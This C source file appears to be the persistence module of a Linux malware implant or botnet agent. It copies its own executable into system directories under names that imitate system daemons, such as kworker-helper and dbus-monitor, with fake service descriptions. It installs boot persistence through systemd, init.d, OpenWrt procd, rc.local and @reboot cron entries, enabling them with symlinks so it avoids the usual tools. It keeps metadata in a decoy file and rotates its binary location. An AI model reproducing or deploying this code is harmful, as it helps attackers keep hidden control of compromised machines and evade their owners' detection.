#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <dirent.h>
#include <stdint.h>
#include <time.h>

#define MODULE_TAG "persist"
#include "headers/debug.h"

#include "headers/persist.h"
#include "headers/rand.h"

/* --- Stealth naming pools --- */

static const char *fake_names[] = {
    "kworker-helper", "dhcpcd-monitor", "ntpd-sync",
    "udevd-helper", "syslogd-rotate", "crond-helper",
    "netlink-monitor", "mdev-trigger", "avahi-helper",
    "dbus-monitor", "logrotate-svc", "tmpfiles-clean",
    "resolved-helper", "busybox-svc", "dropbear-agent",
    "iptables-helper"
};

static const char *fake_descriptions[] = {
    "Kernel Worker Helper", "DHCP Client Monitor",
    "NTP Time Synchronization", "Device Manager Helper",
    "System Log Rotation", "Cron Scheduling Helper",
    "Netlink Event Monitor", "Device Trigger Service",
    "mDNS Service Helper", "Message Bus Monitor",
    "Log Rotation Service", "Temporary Files Cleanup",
    "DNS Resolver Helper", "BusyBox Service Helper",
    "SSH Agent Helper", "Firewall Rules Helper"
};

#define NUM_FAKE_NAMES (sizeof(fake_names) / sizeof(fake_names[0]))

/* --- Init system detection --- */

typedef enum {
    INIT_SYSTEMD  = 1,
    INIT_PROCD    = 2,
    INIT_SYSVINIT = 3,
    INIT_BUSYBOX  = 4,
    INIT_CRON     = 5
} init_type_t;

/* --- Metadata --- */

#define META_MAGIC  0x7F, 0xD3, 0xA1, 0x4E
static const uint8_t meta_magic[4] = { META_MAGIC };

#define META_NAME   "dbus-session.cache"

static const char *meta_dirs[] = {
    "/var/run", "/var/tmp", "/tmp", NULL
};

typedef struct {
    char bin_path[512];
    char svc_path[256];
    uint8_t init_type;
    uint8_t name_idx;
    char uuid[17];
} persist_meta_t;

static persist_meta_t current_meta = {0};
static char installed_path[512] = {0};

/* --- Install directories --- */

static const char *install_dirs[] = {
    "/usr/lib",
    "/usr/libexec",
    "/var/lib",
    "/usr/sbin",
    "/var/tmp",
    "/tmp",
    NULL
};

/* --- Utility functions --- */

static int file_exists(const char *path) {
    return access(path, F_OK) == 0;
}

static int copy_file(const char *src, const char *dst) {
    int fds = open(src, O_RDONLY);
    if (fds < 0) return -1;

    int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fdd < 0) { close(fds); return -1; }

    char buf[4096];
    ssize_t n;
    while ((n = read(fds, buf, sizeof(buf))) > 0) {
        ssize_t written = 0;
        while (written < n) {
            ssize_t w = write(fdd, buf + written, n - written);
            if (w <= 0) { close(fds); close(fdd); unlink(dst); return -1; }
            written += w;
        }
    }
    int read_err = (n < 0);
    close(fds);
    close(fdd);
    if (read_err) { unlink(dst); return -1; }
    chmod(dst, 0755);
    return 0;
}

/* --- Metadata save/load --- */

static const char *find_meta_path(int writable) {
    static char path[512];
    for (int i = 0; meta_dirs[i]; i++) {
        snprintf(path, sizeof(path), "%s/%s", meta_dirs[i], META_NAME);
        if (writable) {
            if (access(meta_dirs[i], W_OK) == 0)
                return path;
        } else {
            if (file_exists(path))
                return path;
        }
    }
    return NULL;
}

static void save_meta(const persist_meta_t *meta) {
    const char *path = find_meta_path(1);
    if (!path) return;

    FILE *f = fopen(path, "wb");
    if (!f) return;

    fwrite(meta_magic, 1, sizeof(meta_magic), f);
    fprintf(f, "%s\n%s\n%u\n%u\n%s\n",
            meta->bin_path,
            meta->svc_path,
            (unsigned)meta->init_type,
            (unsigned)meta->name_idx,
            meta->uuid);
    fclose(f);
    DEBUG_PRINT("Metadata saved to %s", path);
}

static int load_meta(persist_meta_t *meta) {
    for (int i = 0; meta_dirs[i]; i++) {
        char path[512];
        snprintf(path, sizeof(path), "%s/%s", meta_dirs[i], META_NAME);

        FILE *f = fopen(path, "rb");
        if (!f) continue;

        uint8_t magic[4];
        if (fread(magic, 1, 4, f) != 4 || memcmp(magic, meta_magic, 4) != 0) {
            fclose(f);
            continue;
        }

        memset(meta, 0, sizeof(*meta));
        char line[512];
        unsigned init_t = 0, name_i = 0;

        if (fgets(line, sizeof(line), f)) {
            line[strcspn(line, "\n")] = '\0';
            strncpy(meta->bin_path, line, sizeof(meta->bin_path) - 1);
        }
        if (fgets(line, sizeof(line), f)) {
            line[strcspn(line, "\n")] = '\0';
            strncpy(meta->svc_path, line, sizeof(meta->svc_path) - 1);
        }
        if (fgets(line, sizeof(line), f)) {
            sscanf(line, "%u", &init_t);
            meta->init_type = (uint8_t)init_t;
        }
        if (fgets(line, sizeof(line), f)) {
            sscanf(line, "%u", &name_i);
            meta->name_idx = (uint8_t)name_i;
        }
        if (fgets(line, sizeof(line), f)) {
            line[strcspn(line, "\n")] = '\0';
            strncpy(meta->uuid, line, sizeof(meta->uuid) - 1);
        }

        fclose(f);
        DEBUG_PRINT("Metadata loaded from %s", path);
        return 0;
    }
    return -1;
}

static void remove_meta_files(void) {
    for (int i = 0; meta_dirs[i]; i++) {
        char path[512];
        snprintf(path, sizeof(path), "%s/%s", meta_dirs[i], META_NAME);
        unlink(path);
    }
}

/* --- UUID stored in metadata --- */

int persist_load_uuid(char *uuid_out, size_t len) {
    persist_meta_t meta;
    if (load_meta(&meta) == 0 && meta.uuid[0] != '\0') {
        strncpy(uuid_out, meta.uuid, len - 1);
        uuid_out[len - 1] = '\0';
        return 0;
    }
    return -1;
}

void persist_set_uuid(const char *uuid) {
    strncpy(current_meta.uuid, uuid, sizeof(current_meta.uuid) - 1);
}

/* --- Init system detection --- */

static init_type_t detect_init_system(void) {
    if (access("/run/systemd/system", F_OK) == 0)
        return INIT_SYSTEMD;

    if (access("/sbin/procd", F_OK) == 0)
        return INIT_PROCD;

    if (access("/etc/init.d", F_OK) == 0 &&
        (access("/usr/sbin/update-rc.d", X_OK) == 0 ||
         access("/sbin/chkconfig", X_OK) == 0))
        return INIT_SYSVINIT;

    char buf[256];
    ssize_t len = readlink("/proc/1/exe", buf, sizeof(buf) - 1);
    if (len > 0) {
        buf[len] = '\0';
        if (strstr(buf, "busybox"))
            return INIT_BUSYBOX;
    }

    return INIT_CRON;
}

static int has_crontab(void) {
    return access("/usr/bin/crontab", X_OK) == 0 ||
           access("/usr/sbin/crontab", X_OK) == 0 ||
           access("/bin/crontab", X_OK) == 0;
}

/* --- Binary installation --- */

static int install_binary(void) {
    uint8_t idx = (uint8_t)(rand_next() % NUM_FAKE_NAMES);
    const char *name = fake_names[idx];

    for (int i = 0; install_dirs[i]; i++) {
        if (access(install_dirs[i], W_OK) != 0)
            continue;

        char path[512];
        snprintf(path, sizeof(path), "%s/%s", install_dirs[i], name);

        /* Avoid overwriting real system files */
        if (file_exists(path)) {
            struct stat st;
            if (stat(path, &st) == 0 && st.st_size > 0)
                continue;
        }

        if (copy_file("/proc/self/exe", path) == 0) {
            strncpy(installed_path, path, sizeof(installed_path) - 1);
            current_meta.name_idx = idx;
            strncpy(current_meta.bin_path, path, sizeof(current_meta.bin_path) - 1);
            DEBUG_PRINT("Binary installed to %s", path);
            return 0;
        }
    }

    /* Retry with a different name if all collided */
    idx = (uint8_t)((idx + 1) % NUM_FAKE_NAMES);
    name = fake_names[idx];

    for (int i = 0; install_dirs[i]; i++) {
        if (access(install_dirs[i], W_OK) != 0)
            continue;

        char path[512];
        snprintf(path, sizeof(path), "%s/%s", install_dirs[i], name);

        if (file_exists(path)) continue;

        if (copy_file("/proc/self/exe", path) == 0) {
            strncpy(installed_path, path, sizeof(installed_path) - 1);
            current_meta.name_idx = idx;
            strncpy(current_meta.bin_path, path, sizeof(current_meta.bin_path) - 1);
            DEBUG_PRINT("Binary installed to %s (retry)", path);
            return 0;
        }
    }

    DEBUG_PRINT("Failed to install binary to any path");
    return -1;
}

/* --- Extract base name from installed path --- */

static const char *get_svc_name(void) {
    if (current_meta.name_idx < NUM_FAKE_NAMES)
        return fake_names[current_meta.name_idx];
    return "kworker-helper";
}

static const char *get_svc_description(void) {
    if (current_meta.name_idx < NUM_FAKE_NAMES)
        return fake_descriptions[current_meta.name_idx];
    return "Kernel Worker Helper";
}

/* --- Cron persistence (no tags) --- */

static void persist_cron_add(const char *bin_path) {
    FILE *fp_in = popen("crontab -l 2>/dev/null", "r");
    char tmp_file[64];
    snprintf(tmp_file, sizeof(tmp_file), "/tmp/.tmp_%08x", rand_next());
    FILE *fp_out = fopen(tmp_file, "w");

    if (fp_out) {
        if (fp_in) {
            char line[1024];
            while (fgets(line, sizeof(line), fp_in)) {
                if (strstr(line, bin_path)) continue;
                fputs(line, fp_out);
            }
            pclose(fp_in);
            fp_in = NULL;
        }
        fprintf(fp_out, "@reboot %s >/dev/null 2>&1\n", bin_path);
        fclose(fp_out);

        char cmd[256];
        snprintf(cmd, sizeof(cmd), "crontab %s 2>/dev/null", tmp_file);
        system(cmd);
        unlink(tmp_file);
    } else if (fp_in) {
        pclose(fp_in);
    }
    DEBUG_PRINT("Cron entry added for %s", bin_path);
}

static void persist_cron_remove_by_path(const char *bin_path) {
    FILE *fp_in = popen("crontab -l 2>/dev/null", "r");
    if (!fp_in) return;

    char tmp_file[64];
    snprintf(tmp_file, sizeof(tmp_file), "/tmp/.tmp_%08x", rand_next());
    FILE *fp_out = fopen(tmp_file, "w");
    if (fp_out) {
        char line[1024];
        int wrote_lines = 0;
        while (fgets(line, sizeof(line), fp_in)) {
            if (strstr(line, bin_path)) continue;
            fputs(line, fp_out);
            wrote_lines = 1;
        }
        fclose(fp_out);

        if (wrote_lines) {
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "crontab %s 2>/dev/null", tmp_file);
            system(cmd);
        } else {
            system("crontab -r 2>/dev/null");
        }
        unlink(tmp_file);
    }
    pclose(fp_in);
    DEBUG_PRINT("Cron entries removed for %s", bin_path);
}

/* --- Systemd persistence (symlinks, no system() calls) --- */

static void persist_systemd_add(const char *bin_path) {
    if (!file_exists("/etc/systemd/system"))
        return;

    const char *name = get_svc_name();
    const char *desc = get_svc_description();

    char svc_path[256];
    snprintf(svc_path, sizeof(svc_path), "/etc/systemd/system/%s.service", name);

    FILE *f = fopen(svc_path, "w");
    if (!f) return;

    fprintf(f,
        "[Unit]\n"
        "Description=%s\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=%s\n"
        "Restart=on-failure\n"
        "RestartSec=30\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n",
        desc, bin_path);
    fclose(f);
    chmod(svc_path, 0644);

    /* Enable via symlink instead of systemctl */
    char wants_dir[] = "/etc/systemd/system/multi-user.target.wants";
    if (file_exists(wants_dir)) {
        char link_path[512];
        snprintf(link_path, sizeof(link_path), "%s/%s.service", wants_dir, name);
        unlink(link_path);
        symlink(svc_path, link_path);
    }

    strncpy(current_meta.svc_path, svc_path, sizeof(current_meta.svc_path) - 1);
    current_meta.init_type = INIT_SYSTEMD;
    DEBUG_PRINT("Systemd service created: %s", svc_path);
}

static void persist_systemd_remove_by_path(const char *svc_path) {
    if (!svc_path[0]) return;

    /* Extract service name from path */
    char svc_copy[256];
    strncpy(svc_copy, svc_path, sizeof(svc_copy) - 1);
    svc_copy[sizeof(svc_copy) - 1] = '\0';
    const char *svc_name = strrchr(svc_copy, '/');
    if (svc_name) svc_name++;
    else svc_name = svc_copy;

    /* Remove wants symlink */
    char link_path[512];
    snprintf(link_path, sizeof(link_path),
             "/etc/systemd/system/multi-user.target.wants/%s", svc_name);
    unlink(link_path);

    /* Remove service file */
    unlink(svc_path);
    DEBUG_PRINT("Systemd service removed: %s", svc_path);
}

/* --- Init.d persistence (symlinks, no system() calls) --- */

static void persist_initd_add(const char *bin_path) {
    if (!file_exists("/etc/init.d"))
        return;

    const char *name = get_svc_name();

    char initd_path[256];
    snprintf(initd_path, sizeof(initd_path), "/etc/init.d/%s", name);

    FILE *f = fopen(initd_path, "w");
    if (!f) return;

    fprintf(f,
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          %s\n"
        "# Required-Start:    $remote_fs $syslog\n"
        "# Required-Stop:     $remote_fs $syslog\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:      0 1 6\n"
        "### END INIT INFO\n"
        "case \"$1\" in\n"
        "  start) %s & ;;\n"
        "  stop)  pkill -f '%s' ;;\n"
        "esac\n",
        name, bin_path, bin_path);
    fclose(f);
    chmod(initd_path, 0755);

    /* Enable via symlinks in rc?.d instead of update-rc.d */
    static const char *rc_dirs[] = {
        "/etc/rc2.d", "/etc/rc3.d", "/etc/rc4.d", "/etc/rc5.d", NULL
    };
    for (int i = 0; rc_dirs[i]; i++) {
        if (!file_exists(rc_dirs[i])) continue;
        char link[256];
        snprintf(link, sizeof(link), "%s/S90%s", rc_dirs[i], name);
        unlink(link);
        symlink(initd_path, link);
    }

    strncpy(current_meta.svc_path, initd_path, sizeof(current_meta.svc_path) - 1);
    current_meta.init_type = INIT_SYSVINIT;
    DEBUG_PRINT("Init.d script created: %s", initd_path);
}

static void persist_initd_remove_by_path(const char *initd_path) {
    if (!initd_path[0]) return;

    char path_copy[256];
    strncpy(path_copy, initd_path, sizeof(path_copy) - 1);
    path_copy[sizeof(path_copy) - 1] = '\0';
    const char *name = strrchr(path_copy, '/');
    if (name) name++;
    else name = path_copy;

    /* Remove rc?.d symlinks */
    static const char *rc_dirs[] = {
        "/etc/rc2.d", "/etc/rc3.d", "/etc/rc4.d", "/etc/rc5.d", NULL
    };
    for (int i = 0; rc_dirs[i]; i++) {
        char link[256];
        snprintf(link, sizeof(link), "%s/S90%s", rc_dirs[i], name);
        unlink(link);
    }

    unlink(initd_path);
    DEBUG_PRINT("Init.d script removed: %s", initd_path);
}

/* --- Procd persistence (OpenWrt) --- */

static void persist_procd_add(const char *bin_path) {
    if (!file_exists("/etc/init.d"))
        return;

    const char *name = get_svc_name();

    char initd_path[256];
    snprintf(initd_path, sizeof(initd_path), "/etc/init.d/%s", name);

    FILE *f = fopen(initd_path, "w");
    if (!f) return;

    fprintf(f,
        "#!/bin/sh /etc/rc.common\n"
        "START=99\n"
        "STOP=10\n"
        "USE_PROCD=1\n\n"
        "start_service() {\n"
        "  procd_open_instance\n"
        "  procd_set_param command %s\n"
        "  procd_set_param respawn\n"
        "  procd_close_instance\n"
        "}\n",
        bin_path);
    fclose(f);
    chmod(initd_path, 0755);

    /* Enable via symlink in /etc/rc.d */
    if (file_exists("/etc/rc.d")) {
        char link[256];
        snprintf(link, sizeof(link), "/etc/rc.d/S99%s", name);
        unlink(link);
        symlink(initd_path, link);
    }

    strncpy(current_meta.svc_path, initd_path, sizeof(current_meta.svc_path) - 1);
    current_meta.init_type = INIT_PROCD;
    DEBUG_PRINT("Procd service created: %s", initd_path);
}

static void persist_procd_remove_by_path(const char *initd_path) {
    if (!initd_path[0]) return;

    char path_copy[256];
    strncpy(path_copy, initd_path, sizeof(path_copy) - 1);
    path_copy[sizeof(path_copy) - 1] = '\0';
    const char *name = strrchr(path_copy, '/');
    if (name) name++;
    else name = path_copy;

    char link[256];
    snprintf(link, sizeof(link), "/etc/rc.d/S99%s", name);
    unlink(link);

    unlink(initd_path);
    DEBUG_PRINT("Procd service removed: %s", initd_path);
}

/* --- rc.local persistence (no tags) --- */

static void persist_rclocal_add(const char *bin_path) {
    const char *rc = "/etc/rc.local";
    char tmp[256];

    if (!file_exists(rc)) {
        FILE *f = fopen(rc, "w");
        if (!f) return;
        fprintf(f, "#!/bin/sh\nexit 0\n");
        fclose(f);
        chmod(rc, 0755);
    }

    FILE *f_in = fopen(rc, "r");
    if (!f_in) return;

    snprintf(tmp, sizeof(tmp), "%s.tmp", rc);
    FILE *f_out = fopen(tmp, "w");
    if (!f_out) {
        fclose(f_in);
        return;
    }

    char line[1024];
    int already_present = 0;
    int inserted = 0;
    while (fgets(line, sizeof(line), f_in)) {
        if (strstr(line, bin_path)) {
            already_present = 1;
            fclose(f_in);
            fclose(f_out);
            unlink(tmp);
            return;
        }
        if (!inserted && strstr(line, "exit 0")) {
            fprintf(f_out, "%s >/dev/null 2>&1 &\n", bin_path);
            inserted = 1;
        }
        fputs(line, f_out);
    }

    if (!inserted && !already_present) {
        fprintf(f_out, "%s >/dev/null 2>&1 &\n", bin_path);
    }

    fclose(f_in);
    fclose(f_out);

    rename(tmp, rc);
    chmod(rc, 0755);

    current_meta.svc_path[0] = '\0';
    current_meta.init_type = INIT_BUSYBOX;
    DEBUG_PRINT("rc.local entry added for %s", bin_path);
}

static void persist_rclocal_remove_by_path(const char *bin_path) {
    const char *rc = "/etc/rc.local";
    if (!file_exists(rc)) return;

    FILE *f_in = fopen(rc, "r");
    if (!f_in) return;

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "%s.tmp", rc);
    FILE *f_out = fopen(tmp, "w");
    if (!f_out) {
        fclose(f_in);
        return;
    }

    char line[1024];
    while (fgets(line, sizeof(line), f_in)) {
        if (strstr(line, bin_path)) continue;
        fputs(line, f_out);
    }

    fclose(f_in);
    fclose(f_out);

    rename(tmp, rc);
    chmod(rc, 0755);
    DEBUG_PRINT("rc.local entries removed for %s", bin_path);
}

/* --- Main API --- */

void persist_install(void) {
    DEBUG_PRINT("persist_install: starting");

    if (installed_path[0] == '\0') {
        persist_meta_t meta;
        if (load_meta(&meta) == 0 && file_exists(meta.bin_path)) {
            memcpy(&current_meta, &meta, sizeof(current_meta));
            strncpy(installed_path, meta.bin_path, sizeof(installed_path) - 1);
            DEBUG_PRINT("Using existing installation: %s", installed_path);
            return;
        } else {
            if (install_binary() < 0) {
                DEBUG_PRINT("persist_install: binary install failed");
                return;
            }
        }
    }

    init_type_t init = detect_init_system();
    DEBUG_PRINT("Detected init system: %d", init);

    switch (init) {
        case INIT_SYSTEMD:  persist_systemd_add(installed_path); break;
        case INIT_PROCD:    persist_procd_add(installed_path);   break;
        case INIT_SYSVINIT: persist_initd_add(installed_path);   break;
        case INIT_BUSYBOX:  persist_rclocal_add(installed_path); break;
        case INIT_CRON:     persist_cron_add(installed_path);    break;
    }

    /* Add cron as backup if primary method isn't cron */
    if (init != INIT_CRON && has_crontab())
        persist_cron_add(installed_path);

    save_meta(&current_meta);
    DEBUG_PRINT("persist_install: complete (init_type=%d)", init);
}

void persist_rotate_binary(void) {
    persist_meta_t old_meta;
    int have_old = (load_meta(&old_meta) == 0);

    if (!have_old) {
        DEBUG_PRINT("persist_rotate: no previous metadata, first install");
        install_binary();
        return;
    }

    /* Preserve UUID across rotation */
    strncpy(current_meta.uuid, old_meta.uuid, sizeof(current_meta.uuid) - 1);

    DEBUG_PRINT("persist_rotate: old binary = %s", old_meta.bin_path);

    if (install_binary() < 0) {
        DEBUG_PRINT("persist_rotate: failed to install new binary");
        return;
    }

    /* Remove old persistence */
    switch (old_meta.init_type) {
        case INIT_SYSTEMD:  persist_systemd_remove_by_path(old_meta.svc_path); break;
        case INIT_PROCD:    persist_procd_remove_by_path(old_meta.svc_path);   break;
        case INIT_SYSVINIT: persist_initd_remove_by_path(old_meta.svc_path);   break;
        case INIT_BUSYBOX:  persist_rclocal_remove_by_path(old_meta.bin_path); break;
        default: break;
    }
    persist_cron_remove_by_path(old_meta.bin_path);

    /* Install new persistence */
    init_type_t init = detect_init_system();
    switch (init) {
        case INIT_SYSTEMD:  persist_systemd_add(installed_path); break;
        case INIT_PROCD:    persist_procd_add(installed_path);   break;
        case INIT_SYSVINIT: persist_initd_add(installed_path);   break;
        case INIT_BUSYBOX:  persist_rclocal_add(installed_path); break;
        case INIT_CRON:     persist_cron_add(installed_path);    break;
    }
    if (init != INIT_CRON && has_crontab())
        persist_cron_add(installed_path);

    /* Delete old binary */
    if (old_meta.bin_path[0] && strcmp(old_meta.bin_path, installed_path) != 0) {
        unlink(old_meta.bin_path);
        DEBUG_PRINT("persist_rotate: deleted old binary %s", old_meta.bin_path);
    }

    save_meta(&current_meta);
    DEBUG_PRINT("persist_rotate: rotated to %s", installed_path);
}

void persist_remove_all(void) {
    DEBUG_PRINT("persist_remove_all: starting full removal");

    persist_meta_t meta;
    if (load_meta(&meta) == 0) {
        switch (meta.init_type) {
            case INIT_SYSTEMD: persist_systemd_remove_by_path(meta.svc_path); break;
            case INIT_PROCD: persist_procd_remove_by_path(meta.svc_path); break;
            case INIT_SYSVINIT: persist_initd_remove_by_path(meta.svc_path); break;
            case INIT_BUSYBOX: persist_rclocal_remove_by_path(meta.bin_path); break;
            default: break;
        }

        persist_cron_remove_by_path(meta.bin_path);

        if (meta.bin_path[0]) {
            unlink(meta.bin_path);
            DEBUG_PRINT("persist_remove_all: deleted binary %s", meta.bin_path);
        }
    }

    remove_meta_files();
    installed_path[0] = '\0';
    memset(&current_meta, 0, sizeof(current_meta));
    DEBUG_PRINT("persist_remove_all: complete");
}

const char* persist_get_binary_path(void) {
    if (installed_path[0])
        return installed_path;

    persist_meta_t meta;
    if (load_meta(&meta) == 0) {
        strncpy(installed_path, meta.bin_path, sizeof(installed_path) - 1);
        return installed_path;
    }

    return NULL;
}
